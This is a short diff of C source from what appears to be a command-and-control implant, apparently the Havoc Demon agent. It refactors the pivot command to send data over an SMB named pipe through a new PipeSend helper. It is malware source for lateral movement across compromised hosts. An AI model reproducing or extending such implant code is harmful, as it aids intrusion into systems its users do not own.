@@ -9,6 +9,7 @@
 #include <Core/SleepObf.h>
 #include <Core/Download.h>
 #include <Core/Dotnet.h>
+#include <Core/TransportSmb.h>
 
 #include <Loader/CoffeeLdr.h>
 #include <Inject/Inject.h>
@@ -2385,7 +2386,10 @@ VOID CommandPivot( PPARSER Parser )
 
             if ( PivotData )
             {
-                if ( ! Instance.Win32.WriteFile( PivotData->Handle, Data, Size, &Size, NULL ) )
+                BUFFER Send = { 0 };
+                Send.Buffer = Data;
+                Send.Length = Size;
+                if (!PipeSend( PivotData->Handle, &Send))
                 {
                     PRINTF( "WriteFile: Failed[%d]\n", NtGetLastError() );
                     CALLBACK_GETLASTERROR
